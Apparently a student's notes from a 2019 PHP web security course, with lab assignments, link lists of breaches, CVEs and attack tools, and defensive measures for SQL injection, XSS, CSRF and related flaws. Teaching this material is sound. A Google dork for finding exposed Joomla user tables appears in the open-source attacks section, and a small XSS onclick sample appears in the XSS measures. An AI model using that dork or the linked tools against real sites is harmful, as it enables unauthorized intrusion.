# PHP SECURITY CLASS NOTES

## TODO
* How to get rid of `system problem detected` message on Ubuntu
  * Have to remove the crash report
* Lookup what caused phpMyAdmin to break when PHP 7.3 update occurred
  * Either a newly reserved keyword was used
  * or having to do with `__construct()` method signature
* Get a `Faraday Bag` for your keyless entry vehicle!
  * https://www.bbc.com/news/business-47023003
  * https://www.locksmiths.co.uk/faq/keyless-car-theft/
## Assignments
* For Tue 19 Nov 2019
  * Get the VM up and running
  * Lab: Get the ZED Attack Proxy Setup
  * Lab: Firefox and Security Training App
  * Lab: SQL Injection
    * Path to code: `/home/vagrant/Zend/workspaces/DefaultWorkspace/securitytraining/src/vulnerabilities/sqli/source/with.php`
  * Lab: Brute Force
    * Path to code: `/home/vagrant/Zend/workspaces/DefaultWorkspace/securitytraining/src/vulnerabilities/brute/source/with.php`
  * Lab: Zed Attack Proxy Project Exercise
* For Thu 21 Nov 2019
  * Lab: Cross-Site Scripting (XSS)
    * Tidy example, XSSS, XSSR
  * Lab: External XML Entities
  * Lab: CSRF
  * Lab: Security Misconfiguration
  * Lab: Insecure Deserialization
  * Lab: Using Components with Known Vulnerabilities: just look over the information
* For Fri 22 Nov 2019
  * Lab: Insecure Direct Object References #1 and #2
  * Lab: Missing Function Access Level Control (ACL)
  * Lab: Unvalidated Redirects and Forwards
  * Lab: Command Execution
* Not Assigned
  * Lab: Unrestricted File Inclusion
  * Lab: Secure File Uploads
    * NOTE: in the URL you are asked to post via `curl` target s/be `http://securitytraining/`

## TODO

## General Notes
### LAB NOTES
* Good Overview of the Stats and Costs:
  * https://www.thesslstore.com/blog/80-eye-opening-cyber-security-statistics-for-2019/
* ZAP Lab
  * Good "how to": https://chrisdecairos.ca/intercepting-traffic-with-zaproxy/
* Brute Force Detector Lab:
  * Make sure the table `bfdetect` exists:
```
CREATE TABLE `bfdetect` (
  `id` bigint(3) unsigned NOT NULL auto_increment,
  `today` varchar(20) NOT NULL,
  `minute` varchar(3) NOT NULL,
  `ip` varchar(16) NOT NULL,
  `forward_ip` varchar(500) NOT NULL,
  `useragent` varchar(100) NOT NULL,
  `userlan` varchar(100) NOT NULL,
  `isnotify` char(1) default '0',
  `notify4today` char(1) default '0',
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
```
  * Based on the config, found in the securitytraining app config under the 'bfdetect' key, the detector checks the table for previous requests from the various $_SERVER params and logs the request.
  * After four (config) requests are made from the same $_SERVER params within a 5 minute (config) setting, a log entry is created and a response to the attacker is slowed with a sleep option.
  * In order for this script to work, you have to log more than 4 requests in 5 minutes in order for the log entry and sleep response.
  * The table is not populated with data due to this timing requirement which is based on the current server time.
  * You can populate the table with four quick CLI executions, then run the fifth from the securitytraining brute force page with the login.
  * If the `bfdetect` table is not found, load the table create SQL from the dump `/securitytraining/data/sql/course.sql` and you should be able to run the BF tool.

### VM NOTES
* Here is the virtual host definition for `http://sandbox/`:
```
<VirtualHost *:80>
     ServerName sandbox
     DocumentRoot /home/vagrant/Zend/workspaces/DefaultWorkspace/sandbox/public
     <Directory /home/vagrant/Zend/workspaces/DefaultWorkspace/sandbox/public/>
         Options Indexes FollowSymlinks MultiViews
         AllowOverride All
         Require all granted
     </Directory>
 </VirtualHost>
```

### CLASS NOTES
* Pay close attention to anything that Enrico says:
  * https://www.zimuel.it/
* Good presentation on cryptography:
  * http://www.cs.columbia.edu/~suman/security_arch/crypto_summary.pdf

## LATEST
* SQL Injection
  * .NET: https://visualstudiomagazine.com/articles/2019/10/22/top-net-attacks.aspx
  * Find a Place CMS Directory 1.5: https://www.exploit-db.com/exploits/46418
  * phpMyAdmin Designer Feature SQL Injection Vulnerability: https://tools.cisco.com/security/center/viewAlert.x?alertId=59526
  * Wordpress Plugin Vulnerabilities: https://www.woobro.com/wordpress-sql-injection-how-to-prevent-attacks-in-2019/
  * https://www.exploit-db.com/papers/13045/
  * https://bertwagner.com/2018/03/20/how-to-steal-data-using-a-second-order-sql-injection-attack/
  * https://gbhackers.com/latest-google-sql-dorks/
  * https://nakedsecurity.sophos.com/2018/02/19/hackers-sentenced-for-sql-injections-that-cost-300-million/
  * DEF: http://cwe.mitre.org/data/definitions/89.html
  * TOOL: http://sqlmap.org/
* Brute Force
  * https://ktla.com/2018/08/20/latest-scam-email-has-your-real-password-inside-heres-how-they-got-it/
  * https://cybersecurityreviews.net/2019/07/30/nas-targeted-by-brute-force-ransomware-attacks/
  * https://resources.infosecinstitute.com/popular-tools-for-brute-force-attacks/
  * https://www.abuseipdb.com/check/203.195.130.124
  * https://hackercombat.com/password-cracking-tool-hydra/
  * https://securityaffairs.co/wordpress/84948/hacking/hacker-hacked-iot-botnets.html
  * https://gbhackers.com/brute-force-attack-from-outlaw/
  * phpLiteAdmin: Apr 2018: http://k3research.outerhaven.de/posts/small-mistakes-lead-to-big-problems.html
  * Blocked Attempts on WordPress Sites: https://www.wordfence.com/blog/2019/01/analyzing-a-week-of-blocked-attacks/
  * https://www.securityweek.com/spring-2018-password-attacks
  * https://betanews.com/2018/07/03/a-rare-breed-of-the-brute-force-a-history-of-one-attack/
  * https://www.theregister.co.uk/2018/04/03/magento_brute_force_attack/
  * https://blog.paranoidpenguin.net/2018/01/another-significant-wordpress-brute-force-attack-in-the-works/
  * RESOURCES: Good "how to": https://chrisdecairos.ca/intercepting-traffic-with-zaproxy/
  * TOOL: https://www.metasploit.com/
  * TOOL: https://www.hackeroyale.com/crack-passwords-using-thc-hydra/
  * TOOL: simulates a botnet using brute force to crack passwords:
    * https://github.com/JPaulMora/Pyrit
* XSS
  * PHP Script Mall Email Script: https://hackingvila.wordpress.com/2019/02/16/xss-vulnerability-in-responsive-video-news-script-php-script-mall/
  * KindEditor: https://github.com/0xUhaw/CVE-Bins/tree/master/KindEditor
  * https://nvd.nist.gov/vuln/detail/CVE-2018-1000556
  * https://snyk.io/vuln/npm:bootstrap:20160627
  * https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
  * https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
  * TOOL: https://www.virustotal.com/#/home/url
  * DEF: http://cwe.mitre.org/data/definitions/79.html
  * EXPLANATION: https://stackoverflow.com/questions/2526522/csrf-cross-site-request-forgery-attack-example-and-prevention-in-php
  * RESOURCES: https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
    * Uses Subresource Integrity to verify the integrity of the jQuery source
* Broken Auth / Session Mgmt
  * Monstra: https://github.com/monstra-cms/monstra/issues/429
  * PHP Proxy: https://pentest.com.tr/exploits/PHP-Proxy-3-0-3-Local-File-Inclusion.html
  * https://www.okta.com/security-blog/2018/03/5-identity-attacks-that-exploit-your-broken-authentication/
  * https://www.exploit-db.com/exploits/44220/
  * https://blog.knowbe4.com/heads-up-new-exploit-hacks-linkedin-2-factor-auth.-see-this-kevin-mitnick-video
* Insecure Direct Obj Refs
  * https://www.sec-consult.com/en/blog/advisories/insecure-direct-object-reference-in-testlink-open-source-test-management/index.html
  * Demo: http://sweetscomplete.bad.local/
* CSRF
  * Excellent description of the vulnerability and how to mitigate its effects:
    * https://www.gspann.com/resources/blogs/prevention-of-cross-site-request-forgery-vulnerability/
  * usualToolCMS: https://github.com/fdbao/UsualToolCMS/issues/1
  * ZBlogPHP: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9153
  * Vanguard Financial Services: https://github.com/d4wner/Vulnerabilities-Report/blob/master/Vanguard.md
  * PHP Scripts Mall: https://gkaim.com/cve-2018-15187-vikas-chaudhary/
  * https://www.cvedetails.com/cve/CVE-2018-10267/
  * WordPress Plugin (again): https://www.cvedetails.com/cve/CVE-2018-10233/
* Security Misconfig
  * https://www.wordfence.com/blog/2019/05/privilege-escalation-flaw-present-in-slick-popup-plugin/
  * Node.js debugger mode code execution: https://exchange.xforce.ibmcloud.com/vulnerabilities/153454
  * phpMyAdmin: https://www.cvedetails.com/cve/CVE-2017-18264/
  * https://www.databreaches.net/samba-federal-employee-benefit-association-programming-error-resulted-in-mismailed-information/
  * http://arstechnica.com/security/2016/05/faulty-https-settings-leave-dozens-of-visa-sites-vulnerable-to-forgery-attacks/
* Sensitive Data Exp
  * https://www.nytimes.com/2017/09/07/business/equifax-cyberattack.html
  * Jenkins: https://www.cvedetails.com/cve/CVE-2018-1000601/
* Missing Function Level Access Control
  * https://www.symantec.com/security-center/vulnerabilities/writeup/103638
* Using Open Source w/ Known Vulnerabilities
  * Even PHP itself!
    * https://www.linkedin.com/pulse/official-php-git-server-attacked-enrico-zimuel/
  * https://www.cvedetails.com/
  * https://www.cvedetails.com/vulnerability-list/vendor_id-6538/product_id-11031/version_id-235563/Jquery-Jquery-1.6.4.html
* Invalidated Redirects and Forwards
  * https://www.indusface.com/blog/google-vulnerable-open-redirect/
  * https://www.securityfocus.com/bid/82463/discuss
* Web Server Security
  * https://httpd.apache.org/security/vulnerabilities_24.html
  * Don't forget about https://modsecurity.org/
* Command Injection
  * https://www.wordfence.com/blog/2019/05/os-command-injection-vulnerability-patched-in-wp-database-backup-plugin/
* Secure File Uploads
  * Anti-Virus filter for ZF: https://www.sitepoint.com/zf-clamav/
* Insecure CAPTCHA
  * https://andresriancho.com/recaptcha-bypass-via-http-parameter-pollution/
  * Reverse CAPTCHA discussion: https://www.tectite.com/vbforums/showthread.php?5752-Reverse-CAPTCHA-Thoughts-Tips-and-Questions
* Recommended Headers:
  * OWASP recommends the following:
```
// timeout, path, domain, httpCookie, httpOnly
session_set_cookie_params(900, '/', NULL, TRUE, TRUE);
// other recommended headers
header('Pragma: no-cache');
header('Cache-Control: no-cache,no-store,must-revalidate');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1');
header('X-Content-Type-Options: nosniff');
```

# Tools

## PENETRATION TESTING TOOLS
* Zed Attack Proxy Tool
* https://gbhackers.com/category/pentesting/
* http://sqlmap.org/
* https://www.metasploit.com/

## Logs
* Nagios: https://www.nagios.com/solutions/log-monitoring/
* GrayLog: https://www.graylog.org/overview
* logcheck: https://linux.die.net/man/8/logcheck
* LogWatch: https://sourceforge.net/projects/logwatch/
* LogStash: https://www.elastic.co/guide/en/logstash/2.0/introduction.html#power-of-logstash
* PHP Errors: https://sentry.io/welcome/

## Monitoring
* Nagios: https://www.nagios.com/
* Zend Server: http://www.zend.com/en/products/zend_server
* LogWatch (available in Linux)

## Intrusion Detection and Prevention
* SNORT: https://snort.org/

## Firewalls
* Untangle: https://www.untangle.com/
* Apache Web Server Firewall: https://modsecurity.org/

## How to Detect If Your Website Has Been Hacked?
* https://www.virustotal.com/#/home/url
* https://sitecheck.sucuri.net/

# Summary of Preventative Measures

## SQL Injection Suggested Protection:
*  1: use prepared statements to enhance protection against sql injection
*  2: filter and validate all inputs
*  3: treat the database with suspicion as it could have been compromised
*  4: use database users with the lowest possible level of access to do the job required
*  5: encrypting the database passwords might negatively impact performance, but
      you can at least put the credentials in a separate include file
*  6: penetration testing tools for SQL injection:
    * http://sqlmap.org/
    * https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project

LAB: solution should use prepared statements!!!
LAB: examples for SQL injection:
* Went through this worksheet: https://www.exploit-db.com/papers/13045/
* Unable to hack in!
* ID=xxx shows admin however, which is bad


## Brute Force Suggested Protection:
*  0: Any suggested protection may be evaded if the attack is launched from a "botnet"
*  1: Tracking failed login attempts + some kind of redirection or slowdown if X # failed attempts
*  2: CAPTCHA
*  3: Cookie handling: check to see if cookie is being returned or not
*  4: Log attempts based on IP address
*  5: Employ a series of strategies if B.F. attacked detected.  Randomly choose one.  Suggestions:
    -- "Landing" page
    -- Send an email and ask for confirmation
    -- Random Timeout i.e. 30 mins
    -- Send to a page with a CAPTCHA
    -- Ask a security question
* 6: Consider resetting the password + use out-of-band notification (i.e. email)
* 7: if a high level of abuse is noted, extreme measures are called for: i.e. total lockout at IP level
* 8: Generate random temporary redirect pages if excessive failed logins are detected.  Add random ipsum lorem to the temporary pages to further confuse automated attack systems.
* 9: Add random hidden content to the return HTML to further confuse automated attack systems
* 10: Have multiple password and a random rotation

## XSS:
* 1: escape, validate, filter all input
* 2: htmlspecialchars() on output (esp. suspect data)
* 3: use prepared statements + SQL injection protection to prevent stored XSS
* 4: strip_tags() and stripslashes() (maybe) on input
    UNLESS: if you're implementing a CMS, don't strip all tags (used 2nd param of strip_tags())
    Only allow certain ones
    Consider using Zend\Filter\StripTags which can also filter out selected attribs
    strip_tags('<b onclick="javascript:alert("test")">', '<b>');
    would still execute the javascript
* 5: Control the length of your input data
* 6: For CMS implementation, consider using other libraries
    i.e. Zend\Escaper
* 7: Use Zend\Escaper\HtmlAttrib (???) which escapes *contents* of attribs
* 8: from Keoghan to All Participants: just thought I'd share this for the times where html is needed to be allowed through:
    https://github.com/ezyang/htmlpurifier (not sure if everyone will have some across it or not)
* 9: User education: instruct them where to look and what not to do
* 10: Email address validation: https://stackoverflow.com/questions/13719821/email-validation-using-regular-expression-in-php/13719870#13719870
* 11: Inject your data into a DOM, minimized the need to sanitise
```
$document->querySelector("#name-output")->innerText = $_GET["name"]
// also: using PHP DOM extension:
$document->getElementById("name-output"); // doesn't have querySelector by default.
```
* 12: Might need to set [`CORS`](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) headers to allow "legal" cross information sharing for servers under your control

## Insecure Direct Object Reference / Missing Function Level Access Control
* 1: When building the SELECT, encrypt the database key which is exposed to the form
* 2: Implement proper access control for valuable company resources ("objects")
* 3: Redirect and log the "illegal" attempt (i.e. enforce the access control)
* 4: Don't display resources that this user should not access
* 5: Proper session protection + proper logout procedure
* 6: Modify the names of the resources to make them less predictable

## CSRF
* 1: Use hard-to-predict tokens for each unique form access
    I.e. use open ssl pbkdf functionality: http://php.net/manual/en/function.openssl-pbkdf2.php
* 2: Potential programming problem: what if valid user opens same form in 2 windows?
    Possible solution: using an AJAX request (but: can trust the client?)
* 3: Create a profile of the user including User Agent + Language + IP Address etc.
* 4: Implement session protection + XSS measures
* 5: DO NOT use md5 for your hash!!!  Use something like password_hash()
* 6: Consider sending the CSRF token out via a cookie rather than a hidden form field
    * DO NOT use the word "token" to identify the field
    * Use a random string of characters, and store that info in the session
* 7: Once a token is used, throw it away - that makes sense, but I've always wondered what to do with tokens that are _not_ used. Seems like a vulnerability having many active tokens as many users navigate complex sites with many forms.
    * Set some sort of expiration, otherwise you have active, valid, unused tokens sitting around.
LAB: quick test: download form, make a change, submit manually, and see that you've change the password

## Session Protection:
* 1: Run session_regenerate_id() frequently to keep validity of session ID short
    but still maintain the session
* 2: Have the session ID go through cookies (instead of URL)
* 3: Create a profile of the user (i.e. IP address, browser, language settings)
    If anything changes while session is active, flag the session as suspicious
    maybe log this fact, shut down the session, etc.
* 4: Provide a logout option which destroys the session, expires the cookie and unsets data
* 5: Keep sessions as short as possible (but keep usability in mind!)
* 6: Be cautious about fixed session IDs (i.e. "remember me")!!!

## Security Misconfig
* 1: Keep all open source + other software updated
* 2: Improperly configured filesystem rights
* 3: Leaving defaults in place
* 4: Web server defaults for directories should restrict what users can see
* 5: use apachectl -l and apachectl -M to see which modules are loaded
    look for ssl_module especially
* 6: php.ini settings: allow_url_include = off; open_basedir = /set/this/to/something; doc_root = /set/to/something

## Missing Function Level Access Control
* 1: Utilize an Access Control List (ACL) which defines:
  * Resources == tangible assets which need to be secured (i.e. routes, URLs, classes, database tables, directories)
  * Permissions == what actions to be performed on the assets
  * Groups == categories of users
  * Rules == allow XXX group XXX permission to XXX resource
* 2: This vulnerability is difficult to test with most tools
  * Might be able to use a "headless" browser such as `Selenium` (https://docs/seleniumhqorg/)
* 3: Unit testing might help
  * BUT: unit testing won't help with javascript

## Unvalidated Redirects and Forwards
* Also called "Unauthorized Redirects" or "Open Redirects"

## Insufficient Crypto Handling of Sensitive Data
* 1: Don't use old/weak crypto methods (i.e. md5 or sha1)
* 2: Need to determine what is "sensitive data" for your app
* 3: Make sure measures are in place when you store or transfer this data
* 4: Don't store or transmit sensitive data in plain text
* 5: Keep crypto software up to date
* 6: DO NOT use mcrypt!!!! Use openssl_encrypt() or openssl_decrypt() or Sodium (http://php.net/sodium)
    See: https://wiki.php.net/rfc/mcrypt-viking-funeral
* 7: Use a "modern" algorithm; AES is OK + a "modern" mode: suggestions:
    * XTS
    * GCM
    * CTR
* 8: For more info: https://en.wikipedia.org/wiki/Block_cipher

## Insecure Deserialization
* 1: Maybe don't store such information in a cookie: store someplace else (i.e. the Session)
* 2: Enumerate the strategies and only store the enumeration in the cookie; upon return compare with a whitelist of strategies
* 3: Create a digital signature or hash of the object to be stored and confirm upon restoration
* 4: Check to see if `__wakeup()` has been defined, and if so, make sure it doesn't invalidate security measures when object is restored

## Command Injection
* 1: Do you really need to run system(), exec() etc.?  Maybe another way
* 2: Use escapeshellcmd/args()
* 3: php.ini setting "disable_functions = xxx" if you want to block usage of these
* 4: Filtering / validation i.e. filter_var with one of the flags
    Typecasting

## Remote Code Injection
* 1: Don't mix user input with these commands: include, require, eval()
* 2: Set php.ini allow_url_include = off
* 3: Possibly refactor your code so you don't need the user to supply actual PHP filenames
    Establish some sort of routing capability / url rewriting
    Whitelist allowed pages w/ name mappings that the user can choose
    Don't let the user see the actual php file they're going to be using
* 4: Be sure to initiate proper access control / authorization

## Javascript
* 1: consider using "code obfuscation" to obscure your javascript to slow down potential attacks from this vector
* 2: consider using "minified" JS libraries which improves performance and is more difficult to read

## Levy Document
-- UC Berkeley Study
-- Technical + Business Impact of Successful SQL Injection Attacks

# LINK HISTORY

## THREATS:
* https://www.hackmageddon.com/2018/04/06/february-2018-cyber-attacks-statistics/
* https://www.itgovernance.co.uk/blog/list-of-data-breaches-and-cyber-attacks-in-march-2018/
* http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
* https://www.technologyreview.com/s/603500/10-breakthrough-technologies-2017-botnets-of-things/
* http://thehackernews.com/2017/02/HoeflerText-font-chrome.html

## SQL INJECTION:
* https://www.quora.com/As-of-2016-are-there-websites-vulnerable-to-SQL-injection
* https://threatpost.com/attackers-targeting-unpatched-joomla-sites-through-sql-injection-vulnerability/115179/
* http://www.tripwire.com/state-of-security/latest-security-news/one-million-wordpress-websites-vulnerable-to-sql-injection-attack/
* https://securityledger.com/2015/05/mobilizing-sql-injection-attacks-same-pig-new-lipstick/
* http://codecurmudgeon.com/wp/sql-injection-hall-of-shame/

## BRUTE FORCE:
* http://arstechnica.com/security/2013/05/how-crackers-make-minced-meat-out-of-your-passwords/
* https://www.wordfence.com/blog/2016/02/wordpress-password-security/
* http://www.infosecurity-magazine.com/news/massive-bruteforce-attack-on/

## XSS:
* https://nakedsecurity.sophos.com/2016/01/13/ebay-xss-bug-left-users-vulnerable-to-almost-undetectable-phishing-attacks/
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160407-cic

## CSRF:
* https://threatpost.com/bangladesh-bank-hackers-accessed-swift-system-to-steal-cover-tracks/117637/

## OTHER:
* http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html

## RESOURCES:
* https://security.sensiolabs.org/
* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
* http://kalilinuxcourse.blogspot.com/2015/11/hack-facebook-using-python-script-via-brute-force-attack.html
* http://phpsec.org/projects/guide/4.html
* https://info.whitehatsec.com/rs/whitehatsecurity/images/2015-Stats-Report.pdf

## ATTACKS:
* http://arstechnica.com/security/2016/06/how-linkedins-password-sloppiness-hurts-us-all/
* http://arstechnica.com/security/2016/06/teamviewer-users-are-being-hacked-in-bulk-and-we-still-dont-know-how/
* http://arstechnica.com/security/2016/06/10000-wordpress-sites-imperilled-by-in-the-wild-mobile-plugin-exploit/
* http://www.tripwire.com/state-of-security/latest-security-news/one-million-wordpress-websites-vulnerable-to-sql-injection-attack/
* https://securityledger.com/2015/05/mobilizing-sql-injection-attacks-same-pig-new-lipstick/
* http://codecurmudgeon.com/wp/sql-injection-hall-of-shame/
* https://threatpost.com/polish-planes-grounded-after-airline-hit-with-ddos-attack/113412

## SQL INJECTION:
* https://www.quora.com/As-of-2016-are-there-websites-vulnerable-to-SQL-injection
* https://threatpost.com/attackers-targeting-unpatched-joomla-sites-through-sql-injection-vulnerability/115179/
* http://www.tripwire.com/state-of-security/latest-security-news/one-million-wordpress-websites-vulnerable-to-sql-injection-attack/
* https://securityledger.com/2015/05/mobilizing-sql-injection-attacks-same-pig-new-lipstick/
* http://codecurmudgeon.com/wp/sql-injection-hall-of-shame/

## BRUTE FORCE:
* https://www.wordfence.com/blog/2016/02/wordpress-password-security/
* http://www.infosecurity-magazine.com/news/massive-bruteforce-attack-on/
* http://arstechnica.com/security/2013/05/how-crackers-make-minced-meat-out-of-your-passwords/
* http://hashcat.net/oclhashcat/ -- 2.7 to 115 million MD5 hashes cracked per second depending on GPU available

## XSS:
* https://nakedsecurity.sophos.com/2016/01/13/ebay-xss-bug-left-users-vulnerable-to-almost-undetectable-phishing-attacks/
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160407-cic

## CSRF:
* https://threatpost.com/bangladesh-bank-hackers-accessed-swift-system-to-steal-cover-tracks/117637/

## INSECURE CONFIG:
* https://www.databreaches.net/samba-federal-employee-benefit-association-programming-error-resulted-in-mismailed-information/
* http://arstechnica.com/security/2016/05/faulty-https-settings-leave-dozens-of-visa-sites-vulnerable-to-forgery-attacks/

## SENSITIVE DATA EXPOSURE:
* https://thenextweb.com/insider/2018/03/16/dutch-data-protection-authority-leak/

## PHP:
* http://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html
* http://www.exploit-db.com/platform/?p=php

## EXPLOIT KITS:
* http://www.eweek.com/security/exploit-kits-deliver-big-returns-for-hackers.html
* https://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit-3/
* https://media.blackhat.com/bh-us-12/Briefings/Jones/BH_US_12_Jones_State_Web_Exploits_Slides.pdf

## RESOURCES:
* http://httpd.apache.org/docs/current/misc/security_tips.html
* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
* http://kalilinuxcourse.blogspot.com/2015/11/hack-facebook-using-python-script-via-brute-force-attack.html
* https://www.virustotal.com/en/
* https://info.whitehatsec.com/rs/whitehatsecurity/images/2015-Stats-Report.pdf
* http://resources.infosecinstitute.com/14-popular-web-application-vulnerability-scanners/
* https://panopticlick.eff.org/
* https://www.torproject.org/

## SECURITY THREATS:
* http://www.net-security.org/secworld.php?id=18087
* http://www.ponemon.org/blog/ponemon-institute-releases-2014-cost-of-data-breach-global-analysis
* http://www.darkreading.com/travel-agency-fined--gb-pound-150000-for-violating-data-protection-act/d/d-id/1297538?
* http://www.tripwire.com/state-of-security/top-security-stories/organizations-remain-vulnerable-to-sql-injection-attacks/
* http://www.sophos.com/en-us/security-news-trends/reports/security-threat-report/blackhole-exploit.aspx
* http://www.avgthreatlabs.com/webthreats/

## HELP FOR HACKED SITES:
* http://www.google.com/webmasters/hacked/

## PHP EXPLOITS:
* http://www.joomlaexploit.com/
* http://blog.resellerclub.com/2013/04/12/global-attack-on-wordpress-sites/
* http://www.zionsecurity.com/blog/2013/02/analysis-automated-attack-against-php-web-sites
* http://www.forbes.com/sites/anthonykosner/2013/04/13/wordpress-under-attack-how-to-avoid-the-coming-botnet/
* http://wewatchyourwebsite.com/wordpress/2013/01/attack-of-the-default-php-files/
* http://www.cerebro.com.au/2013/06/24/ddos-attack-this-blog-via-xmlrpc-php/
* http://labs.alienvault.com/labs/index.php/2013/u-s-department-of-labor-website-hacked-and-redirecting-to-malicious-code/

## CHARACTER SET ATTACKS:
* http://www.phpwact.org/php/i18n/charsets
* http://www.joelonsoftware.com/articles/Unicode.html

## OPEN SOURCE ATTACKS:
-- joomla
joomla 1.5.26 hack: * http://3dwebdesign.org/forum/new-joomla-1-5-26-and-joomla-2-5-exploit-t1113
SEE: www/php_sec/exploits/joomla_godaddy/*

Top 10 joomla security issues: * http://www.deanmarshall.co.uk/joomla-services/joomla-security/joomla-security-issues.html
bluestork template hack: * http://truxtertech.com/2012/10/joomla-bluestork-built-in-virus/
htaccess hacked / GoDaddy: * http://www.novel139.info/bbs/forum.php?mod=viewthread&tid=485
how to secure a joomla site which has been hacked: * http://forum.joomla.org/viewtopic.php?f=621&t=582854
forum post assistant: * https://github.com/ForumPostAssistant/FPA/zipball/en-GB
From Google type this: inurl:"jos_users" inurl:"index.php"
-- drupal
* http://drupal.org/node/1815912

## WEBSITES WITH ERRORS:
* http://www.thamesriverservices.co.uk/timetable_winter.cfm

## HACKS:
* http://www.troyhunt.com/2013/07/everything-you-wanted-to-know-about-sql.html
* http://blog.whitehatsec.com/top-ten-web-hacking-techniques-of-2012/
* https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-March/007631.html (http response splitting)
* http://www.darkreading.com/tech-center/6/Vulnerability_Management.html
* https://www.youtube.com/watch?v=igub7ZF5p40 [hacking things using Google, includes PHP issue]

## HACKS EXPLAINED ON YOUTUBE:
SQL Injection: * https://www.youtube.com/watch?v=N7l6pPEDuPM
Joomla Hack:* http://www.youtube.com/watch?v=KFr1k7-8HT8
Facebook SQL Injection: * https://www.youtube.com/watch?v=1yfTaXndMEM
OWASP Security Tutorial Series:
* https://www.youtube.com/watch?v=_Z9RQSnf8-g [owasp xss]
* https://www.youtube.com/watch?v=pypTYPaU7mM&feature=plcp [owasp injection]

## PREVIOUS ATTACKS:
* http://arstechnica.com/security/2015/05/https-crippling-attack-threatens-tens-of-thousands-of-web-and-mail-servers/
* http://www.darkreading.com/vulnerabilities---threats/advanced-threats/report-nsa-gchq-actively-targeted-kaspersky-lab-other-security-vendors/d/d-id/1320991?
* https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss.html
* http://www.openwall.com/lists/oss-security/2015/04/10/8
* http://www.tripwire.com/state-of-security/top-security-stories/hackers-redirected-ebay-shoppers-to-phishing-scam/
* http://www.tripwire.com/state-of-security/top-security-stories/cybercrime-ring-steals-millions-in-stubhub-tickets-arrests-followed/
* http://www.troyhunt.com/2014/02/heres-how-bell-was-hacked-sql-injection.html
* http://www.tripwire.com/state-of-security/top-security-stories/personal-bank-accounts-in-jeopardy-multi-pronged-cyber-attack-on-switzerland-underway/
* http://english.astroawani.com/news/show/malaysias-google-dell-microsoft-websites-hacked-17481
* http://japandailypress.com/nintendo-fan-site-hit-by-illegal-logins-nearly-24000-accounts-hacked-0831890
* http://uk.ign.com/articles/2013/07/02/ubisofts-uplay-service-hacked
* http://www.guardian.co.uk/world/2013/jun/10/nsa-spying-scandal-what-we-have-learned
* http://www.ehackingnews.com/2013/07/15-goa-government-websites-hacked-by.html
* http://www.ehackingnews.com/2013/03/5-cybercriminals-arrested-for-stealing.html
* http://www.zdnet.com/nbc-com-hacked-briefly-compromised-with-redkit-malware-7000011636/
* http://www.v3.co.uk/v3-uk/news/2257171/bbc-and-cnn-spam-linked-to-blackhole-exploit-kit
* http://www.bbc.co.uk/news/technology-21304049
* http://www.ehackingnews.com/2013/03/peru-bhutan-government-sites-breached.html
* http://uk.reuters.com/article/2012/11/27/us-nuclear-iaea-hacking-idUKBRE8AQ0ZY20121127
* http://www.telegraph.co.uk/news/uknews/law-and-order/9696079/Anonymous-hacker-cost-PayPal-3.5-million-by-crippling-site.html
* http://www.channel4.com/news/hackers-use-government-jobs-site-to-steal-your-data
* http://www.bbc.co.uk/news/uk-england-lancashire-20651852
* http://www.informationweek.com/security/attacks/who-is-hacking-us-banks-8-facts/240009554
* http://www.networkworld.com/news/2011/101911-sql-injection-attack-252188.html
* http://arstechnica.com/security/news/2011/03/massive-sql-injection-attack-making-the-rounds694k-urls-so-far.ars
* http://theharmonyguy.com/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/
* http://news.cnet.com/8301-27080_3-20107541-245/hundreds-of-go-daddy-hosted-sites-compromised/?tag=contentMain;contentBody
* http://www.informationweek.com/news/government/security/230600152
* http://www.pcworld.com/article/240205/beware_the_assembling_bot_army.html
* http://packetstormsecurity.org/news/view/19881/Japans-Biggest-Defense-Contractor-Hit-By-Hackers.html
* http://www.rawstory.com/rs/2011/06/06/sony-shares-tumble-after-latest-security-hack/
* http://news.cnet.com/8301-30685_3-20108633-264/researchers-to-detail-hole-in-web-encryption/?tag=contentMain;contentBody
* http://www.securecomputing.net.au/News/233534,googleowned-social-network-sees-400000-users-hit-by-xss-attack.aspx
* http://www.securecomputing.net.au/News/217809,researcher-demonstrates-twitter-xss-vulnerability.aspx
* http://www.pcpro.co.uk/news/security/361717/apple-tops-public-vulnerability-list

## PREVIOUS THREATS:
* http://www.ibtimes.co.uk/over-1-million-decrypted-gmail-yahoo-accounts-allegedly-sale-dark-web-1609882?utm_source=yahoo&utm_medium=referral&utm_campaign=rss-related&utm_content=/rss/yahoous/news
* http://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit-2/
* http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
* http://blog.sucuri.net/2012/05/php-cgi-vulnerability-exploited-in-the-wild.html
* http://www.infoworld.com/t/application-security/critical-php-vulnerability-exposes-servers-data-theft-or-worse-192428
* http://www.nytimes.com/2012/12/06/technology/ransomware-is-expanding-in-the-united-states.html?_r=0
* http://seclists.org/fulldisclosure/2011/Mar/309
* https://www.whitehatsec.com/resource/grossmanarchives/11grossmanarchives/022111hacktechniques2011.html
* http://jeremiahgrossman.blogspot.com/2011/03/11th-whitehat-website-security.html
